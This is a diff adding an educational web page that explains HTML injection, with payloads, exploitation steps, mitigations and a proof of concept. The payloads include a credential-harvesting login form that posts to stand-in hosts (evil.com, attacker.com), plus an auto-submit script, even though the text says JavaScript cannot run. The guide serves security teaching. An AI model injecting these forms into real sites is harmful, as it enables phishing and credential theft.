@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>HTML Injection | Web Security | Saikumar Raju</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <style>/* same as NoSQL page */</style>
+</head>
+<body>
+  <!-- navigation same as above -->
+  <main>
+    <div class="container">
+      <div class="breadcrumb"><a href="../knowledge-base.html">Knowledge Base</a> / <a href="index.html">Web Security</a> / HTML Injection</div>
+      <div class="page-header">
+        <span class="severity-badge"><i class="fas fa-exclamation-triangle"></i> Medium to High Severity</span>
+        <h1>📌 HTML Injection</h1>
+      </div>
+
+      <div class="content-section">
+        <h2>🧠 Description</h2>
+        <p><strong>What is HTML Injection?</strong></p>
+        <p>HTML injection occurs when user input is reflected in the page without proper encoding, allowing an attacker to inject arbitrary HTML markup. Unlike XSS, the attacker cannot execute JavaScript (if the injection point is safe from script execution), but they can inject headings, images, forms, and links. This is dangerous for phishing – an attacker can inject a fake login form into a legitimate trusted page, stealing credentials from unsuspecting users who trust the domain.</p>
+        <p><strong>Security principle violated:</strong> Output Encoding</p>
+      </div>
+
+      <div class="content-section">
+        <h2>🏷️ Classification</h2>
+        <ul>
+          <li><strong>Type:</strong> Injection</li>
+          <li><strong>OWASP:</strong> A03:2021 – Injection</li>
+          <li><strong>CWE:</strong> CWE-79 (subset) / CWE-80</li>
+        </ul>
+      </div>
+
+      <div class="content-section">
+        <h2>🎯 Attack Surface</h2>
+        <ul>
+          <li>✅ Search boxes where the query term is reflected</li>
+          <li>✅ Comment/feedback fields</li>
+          <li>✅ Profile name / display name fields</li>
+          <li>✅ Error messages that reflect user input</li>
+        </ul>
+      </div>
+
+      <div class="content-section">
+        <h2>💣 Basic Payloads</h2>
+        <div class="payload-grid">
+          <div class="payload-item">&lt;h1&gt;Injected Heading&lt;/h1&gt;</div>
+          <div class="payload-item">&lt;img src="https://evil.com/fake.png"&gt;</div>
+          <div class="payload-item">&lt;a href="https://evil.com"&gt;Click here&lt;/a&gt;</div>
+          <div class="payload-item">&lt;form action="https://evil.com/steal"&gt;&lt;input type="password"&gt;&lt;input type="submit"&gt;&lt;/form&gt;</div>
+        </div>
+      </div>
+
+      <div class="content-section">
+        <h2>⚙️ Exploitation Steps</h2>
+        <ol>
+          <li>Identify any input that is later displayed on the page (search term, comment, profile name).</li>
+          <li>Inject a simple HTML tag, e.g., <code>&lt;h1&gt;Test&lt;/h1&gt;</code>.</li>
+          <li>If the heading appears as formatted, HTML injection is confirmed.</li>
+          <li>To demonstrate impact, inject a fake login form pointing to an external server. If the form renders, take a screenshot as proof of concept.</li>
+        </ol>
+      </div>
+
+      <div class="content-section">
+        <h2>🛡️ Mitigation</h2>
+        <div class="mitigation-box">
+          <strong>✅ Always HTML‑encode user input before reflecting it (use <code>htmlspecialchars()</code> in PHP, equivalent in other frameworks)</strong><br>
+          <strong>✅ Use a Content Security Policy to restrict form actions</strong><br>
+          <strong>✅ Validate input to reject HTML tags if not needed</strong>
+        </div>
+      </div>
+
+      <div class="content-section">
+        <h2>📎 Proof of Concept (PoC)</h2>
+        <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+          <pre>&lt;form action="https://attacker.com/steal" method="POST"&gt;
+  &lt;input type="text" name="username" placeholder="Username"&gt;
+  &lt;input type="password" name="password" placeholder="Password"&gt;
+  &lt;input type="submit" value="Login"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</pre>
+        </div>
+      </div>
+
+      <div class="content-section">
+        <h2>📚 References</h2>
+        <ul>
+          <li><a href="https://owasp.org/www-community/attacks/HTML_Injection" class="reference-link" target="_blank" style="color: var(--primary);">OWASP – HTML Injection</a></li>
+        </ul>
+      </div>
+
+      <a href="index.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to Web Security</a>
+    </div>
+  </main>
+  <footer><p>Saikumar Raju — Cybersecurity Consultant | HTML Injection Guide</p></footer>
+  <script>/* copy and dark mode */</script>
+</body>
+</html>
